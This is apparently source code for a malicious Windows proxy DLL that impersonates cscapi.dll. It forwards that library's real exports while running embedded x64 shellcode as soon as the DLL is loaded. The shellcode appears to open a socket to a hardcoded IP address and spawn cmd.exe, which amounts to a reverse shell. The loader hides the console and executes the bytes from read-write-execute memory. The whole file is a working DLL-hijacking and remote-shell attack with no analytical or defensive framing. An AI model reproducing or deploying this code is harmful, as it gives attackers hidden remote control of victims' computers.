#pragma once

#pragma comment(linker,"/export:CscNetApiGetInterface=C:\\Windows\\System32\\cscapi.dll.CscNetApiGetInterface,@1")
#pragma comment(linker,"/export:CscSearchApiGetInterface=C:\\Windows\\System32\\cscapi.dll.CscSearchApiGetInterface,@2")
#pragma comment(linker,"/export:OfflineFilesEnable=C:\\Windows\\System32\\cscapi.dll.OfflineFilesEnable,@3")
#pragma comment(linker,"/export:OfflineFilesGetShareCachingMode=C:\\Windows\\System32\\cscapi.dll.OfflineFilesGetShareCachingMode,@4")
#pragma comment(linker,"/export:OfflineFilesQueryStatus=C:\\Windows\\System32\\cscapi.dll.OfflineFilesQueryStatus,@5")
#pragma comment(linker,"/export:OfflineFilesQueryStatusEx=C:\\Windows\\System32\\cscapi.dll.OfflineFilesQueryStatusEx,@6")
#pragma comment(linker,"/export:OfflineFilesStart=C:\\Windows\\System32\\cscapi.dll.OfflineFilesStart,@7")


#include <windows.h>
#include "pch.h"
#define CopyMemory RtlCopyMemory

VOID Payload() {
    unsigned char shellcode[] = {
0x48,0x31,0xd2,0x65,0x48,0x8b,0x42,0x60,0x48,0x8b,0x70,0x18,0x48,0x8b,0x76,0x30,0x4c,0x8b,0x0e,0x4d,
0x8b,0x09,0x4d,0x8b,0x49,0x10,0xeb,0x63,0x41,0x8b,0x49,0x3c,0x4d,0x31,0xff,0x41,0xb7,0x88,0x4d,0x01,
0xcf,0x49,0x01,0xcf,0x45,0x8b,0x3f,0x4d,0x01,0xcf,0x41,0x8b,0x4f,0x18,0x45,0x8b,0x77,0x20,0x4d,0x01,
0xce,0xe3,0x3f,0xff,0xc9,0x48,0x31,0xf6,0x41,0x8b,0x34,0x8e,0x4c,0x01,0xce,0x48,0x31,0xc0,0x48,0x31,
0xd2,0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xca,0x0d,0x01,0xc2,0xeb,0xf4,0x44,0x39,0xc2,0x75,0xda,0x45,
0x8b,0x57,0x24,0x4d,0x01,0xca,0x41,0x0f,0xb7,0x0c,0x4a,0x45,0x8b,0x5f,0x1c,0x4d,0x01,0xcb,0x41,0x8b,
0x04,0x8b,0x4c,0x01,0xc8,0xc3,0xc3,0x4c,0x89,0xcd,0x41,0xb8,0x8e,0x4e,0x0e,0xec,0xe8,0x8f,0xff,0xff,
0xff,0x49,0x89,0xc4,0x48,0x31,0xc0,0x66,0xb8,0x6c,0x6c,0x50,0x48,0xb8,0x57,0x53,0x32,0x5f,0x33,0x32,
0x2e,0x64,0x50,0x48,0x89,0xe1,0x48,0x83,0xec,0x20,0x4c,0x89,0xe0,0xff,0xd0,0x48,0x83,0xc4,0x20,0x49,
0x89,0xc6,0x49,0x89,0xc1,0x41,0xb8,0xcb,0xed,0xfc,0x3b,0x4c,0x89,0xcb,0xe8,0x55,0xff,0xff,0xff,0x48,
0x31,0xc9,0x66,0xb9,0x98,0x01,0x48,0x29,0xcc,0x48,0x8d,0x14,0x24,0x66,0xb9,0x02,0x02,0x48,0x83,0xec,
0x30,0xff,0xd0,0x48,0x83,0xc4,0x30,0x49,0x89,0xd9,0x41,0xb8,0xd9,0x09,0xf5,0xad,0xe8,0x2b,0xff,0xff,
0xff,0x48,0x83,0xec,0x30,0x48,0x31,0xc9,0xb1,0x02,0x48,0x31,0xd2,0xb2,0x01,0x4d,0x31,0xc0,0x41,0xb0,
0x06,0x4d,0x31,0xc9,0x4c,0x89,0x4c,0x24,0x20,0x4c,0x89,0x4c,0x24,0x28,0xff,0xd0,0x49,0x89,0xc4,0x48,
0x83,0xc4,0x30,0x49,0x89,0xd9,0x41,0xb8,0x0c,0xba,0x2d,0xb3,0xe8,0xf3,0xfe,0xff,0xff,0x48,0x83,0xec,
0x20,0x4c,0x89,0xe1,0x48,0x31,0xd2,0xb2,0x02,0x48,0x89,0x14,0x24,0x48,0x31,0xd2,0x66,0xba,0x01,0xbb,
0x48,0x89,0x54,0x24,0x02,0xba,0xc0,0xa8,0x01,0x15,0x48,0x89,0x54,0x24,0x04,0x48,0x8d,0x14,0x24,0x4d,
0x31,0xc0,0x41,0xb0,0x16,0x4d,0x31,0xc9,0x48,0x83,0xec,0x38,0x4c,0x89,0x4c,0x24,0x20,0x4c,0x89,0x4c,
0x24,0x28,0x4c,0x89,0x4c,0x24,0x30,0xff,0xd0,0x48,0x83,0xc4,0x38,0x49,0x89,0xe9,0x41,0xb8,0x72,0xfe,
0xb3,0x16,0xe8,0x99,0xfe,0xff,0xff,0x48,0xba,0x9c,0x92,0x9b,0xd1,0x9a,0x87,0x9a,0xff,0x48,0xf7,0xd2,
0x52,0x48,0x89,0xe2,0x41,0x54,0x41,0x54,0x41,0x54,0x48,0x31,0xc9,0x66,0x51,0x51,0x51,0xb1,0xff,0x66,
0xff,0xc1,0x66,0x51,0x48,0x31,0xc9,0x66,0x51,0x66,0x51,0x51,0x51,0x51,0x51,0x51,0x51,0xb1,0x68,0x51,
0x48,0x89,0xe7,0x48,0x89,0xe1,0x48,0x83,0xe9,0x20,0x51,0x57,0x48,0x31,0xc9,0x51,0x51,0x51,0x48,0xff,
0xc1,0x51,0xfe,0xc9,0x51,0x51,0x51,0x51,0x49,0x89,0xc8,0x49,0x89,0xc9,0xff,0xd0 };

    const size_t buf_size = sizeof(shellcode);


        // Hide the console window
        ShowWindow(GetConsoleWindow(), SW_HIDE);

        // Create a file mapping object
        HANDLE mem_handle = CreateFileMappingA(
            INVALID_HANDLE_VALUE,  // Use the paging file
            NULL,                   // Default security attributes
            PAGE_EXECUTE_READWRITE, // Read, write, and execute permissions
            0,                      // High-order size of the mapping
            buf_size,               // Low-order size of the mapping
            NULL                    // Name of the mapping object (unnamed)
        );

        if (mem_handle == NULL) {
            MessageBoxA(NULL, "Failed to create file mapping", "Error", MB_ICONERROR);
            return;
        }

        // Map the file mapping object into the address space
        void* mem_map = MapViewOfFile(
            mem_handle,                     // Handle to the file mapping object
            FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, // Read, write, and execute permissions
            0,                              // High-order offset
            0,                              // Low-order offset
            buf_size                        // Number of bytes to map
        );

        if (mem_map == NULL) {
            MessageBoxA(NULL, "Failed to map view of file", "Error", MB_ICONERROR);
            CloseHandle(mem_handle);
            return;
        }

        // Copy the payload into the mapped memory
        CopyMemory(mem_map, shellcode, buf_size);

        // Execute the payload
        int result = ((int(*)())mem_map)();

        // Display the result (for demonstration purposes)
        char message[64];
        wsprintfA(message, "Payload executed with result: %d", result);
        MessageBoxA(NULL, message, "Result", MB_OK);

        // Clean up
        UnmapViewOfFile(mem_map);
        CloseHandle(mem_handle);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        Payload();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
